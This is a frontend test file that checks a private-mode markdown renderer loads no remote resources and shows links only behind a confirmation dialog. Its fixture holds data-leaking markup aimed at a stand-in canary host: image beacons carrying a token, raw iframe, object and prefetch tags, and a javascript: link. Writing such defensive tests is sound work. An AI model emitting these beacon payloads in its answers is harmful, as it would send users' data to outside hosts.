// @vitest-environment happy-dom
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { PrivateMarkdown } from "@/components/private/private-markdown";

import { installNetworkTrap } from "./helpers/network-trap";

/**
 * A local answer must not be able
 * to make the browser load anything. No <img src>, no raw HTML, no live link.
 */

const CANARY = "KORUM-CANARY-b2";
const HOSTILE = [
  `![remote](https://canary.test/?c=${CANARY})`,
  `![same-origin](/canary-same-origin?c=${CANARY})`,
  `![data](data:image/png;base64,iVBORw0KGgo=)`,
  `![blob](blob:https://korum.to/1234)`,
  `<img src="https://canary.test/raw?c=${CANARY}">`,
  `<iframe src="https://canary.test/frame"></iframe><video src="https://canary.test/v.mp4"></video>`,
  `<link rel="prefetch" href="https://canary.test/p"><object data="https://canary.test/o"></object>`,
  `[click me](https://canary.test/link?c=${CANARY})`,
  `<https://canary.test/autolink>`,
  `[js](javascript:alert(1))`,
].join("\n\n");

describe("private markdown (static render)", () => {
  const html = renderToStaticMarkup(<PrivateMarkdown content={HOSTILE} />);

  it("renders no <img> and no src attribute at all", () => {
    expect(html).not.toMatch(/<img\b/i);
    expect(html).not.toMatch(/\ssrcset=/i);
    expect(html).not.toMatch(/\ssrc=/i);
  });

  it("renders no raw HTML resource elements", () => {
    for (const tag of ["iframe", "video", "audio", "source", "link", "object", "embed", "script"]) {
      expect(html).not.toMatch(new RegExp(`<${tag}\\b`, "i"));
    }
  });

  it("shows images as text placeholders with their address", () => {
    expect(html).toContain("Image not loaded in Private Mode: remote");
    expect(html).toContain(`https://canary.test/?c=${CANARY}`);
    expect(html.match(/data-private-image-placeholder/g)?.length).toBe(4);
  });

  it("renders links without a live href, with no-referrer", () => {
    expect(html).not.toMatch(/\shref=/i);
    expect(html).not.toMatch(/\sping=/i);
    expect(html).toContain(`data-private-href="https://canary.test/link?c=${CANARY}"`);
    expect(html).toMatch(/referrerpolicy="no-referrer"/i);
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).not.toContain("javascript:");
  });
});

describe("private markdown (interactive)", () => {
  let trap: ReturnType<typeof installNetworkTrap>;
  let root: Root;
  let container: HTMLDivElement;
  let open: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    trap = installNetworkTrap();
    open = vi.fn();
    window.open = open as unknown as typeof window.open;
    container = document.createElement("div");
    document.body.appendChild(container);
    root = createRoot(container);
    await act(async () => root.render(<PrivateMarkdown content={HOSTILE} />));
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    container.remove();
    trap.restore();
  });

  it("mounting makes no requests and leaves no img[src] in the DOM", () => {
    expect(document.querySelectorAll("img").length).toBe(0);
    expect(document.querySelectorAll("[src]").length).toBe(0);
    expect(trap.requests).toEqual([]);
  });

  it("clicking a link opens the confirm dialog; Cancel opens nothing", async () => {
    const link = container.querySelector<HTMLElement>("[data-private-href]")!;
    await act(async () => link.click());
    expect(document.body.textContent).toContain("Open a website outside Private Mode?");
    expect(document.body.textContent).toContain(`https://canary.test/link?c=${CANARY}`);

    const cancel = [...document.querySelectorAll("button")].find((b) => b.textContent === "Cancel")!;
    await act(async () => cancel.click());
    expect(open).not.toHaveBeenCalled();
    expect(trap.requests).toEqual([]);
  });

  it("Open uses noopener,noreferrer", async () => {
    const link = container.querySelector<HTMLElement>("[data-private-href]")!;
    await act(async () => link.click());
    const confirm = [...document.querySelectorAll("button")].find((b) => b.textContent === "Open")!;
    await act(async () => confirm.click());
    expect(open).toHaveBeenCalledWith(`https://canary.test/link?c=${CANARY}`, "_blank", "noopener,noreferrer");
  });
});
